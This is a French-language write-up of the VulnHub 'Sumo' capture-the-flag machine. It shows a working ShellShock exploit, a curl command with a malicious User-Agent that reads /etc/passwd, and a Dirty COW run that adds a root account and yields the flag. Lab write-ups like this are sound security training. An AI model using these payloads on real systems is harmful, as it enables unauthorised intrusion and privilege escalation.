# Solution du CTF Sumo de VulnHub

One way or another
------------------

Voici un writeup pour [Sumo](https://www.vulnhub.com/entry/sumo-1,480/), petit CTF créé par *SunCSR Team*.  

```plain
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)
|   2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)
|_  256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
```

On a un serveur web et un serveur SSH. Comme vous le verrez on pourra même se passer du second.  

Je lance Nuclei sur le serveur web qui me trouve direct une vulnérabilité :  

```plain
[2021-12-27 11:56:38] [CVE-2014-6271] [http] [critical] http://192.168.56.15/cgi-bin/test
```

Il s'agit de la faille ShellShock. Wapiti est en mesure de confirmer la vulnérabilité :  

```plain
$ ./bin/wapiti -u http://192.168.56.15/cgi-bin/test --scope url -m shellshock
ujson module not found, using json
msgpack not installed, MsgPackSerializer unavailable

     __      __               .__  __  .__________
    /  \    /  \_____  ______ |__|/  |_|__\_____  \
    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
     \        /  / __ \|  |_> >  ||  | |  |/       \
      \__/\  /  (____  /   __/|__||__| |__/______  /
           \/        \/|__|                      \/
Wapiti 3.0.9 (wapiti.sourceforge.io)
[*] Enregistrement de l'état du scan, veuillez patienter...
[!] Unable to import module ssl

[*] Lancement du module shellshock
L'URL http://192.168.56.15/cgi-bin/test semble vulnérable à l'attaque Shellshock !
```

I'm gonna find ya
-----------------

On peut exploiter la vulnérabilité directement avec cURL :  

```plain
$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://192.168.56.15/cgi-bin/test

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
sumo:x:1000:1000:sumo,,,:/home/sumo:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```

J'ai profite donc pour obtenir un shell via *ReverseSSH*.  

L'utilisateur *sumo* est intéressant car fait partie de groupes privilégiés :  

```plain
uid=1000(sumo) gid=1000(sumo) groups=1000(sumo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),109(sambashare)
```

Mais il ne dispose ni de fichiers ni de processus utilisables pour une escalade de privilèges...  

I'm gonna getcha getcha getcha getcha
-------------------------------------

La machine est vulnérable à différents exploits Kernel dont [Dirty COW](https://dirtycow.ninja/).  

L'exploit signé Firefart donne généralement des bons résultats donc je ne suis pas allé chercher ailleurs.  

```plain
www-data@ubuntu:/tmp$ ./dirty holyc0w
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: holyc0w
Complete line:
firefart:fim4kAXNC8Hg6:0:0:pwned:/root:/bin/bash

mmap: 7f3cf6da9000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'holyc0w'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'holyc0w'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
www-data@ubuntu:/tmp$ grep firefart /etc/passwd
Binary file /etc/passwd matches
www-data@ubuntu:/tmp$ su firefart
Password: 
firefart@ubuntu:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@ubuntu:/tmp# cd /root
firefart@ubuntu:~# ls
root.txt
firefart@ubuntu:~# cat root.txt
{Sum0-SunCSR-2020_r001}
```



*Published December 27 2021 at 13:38*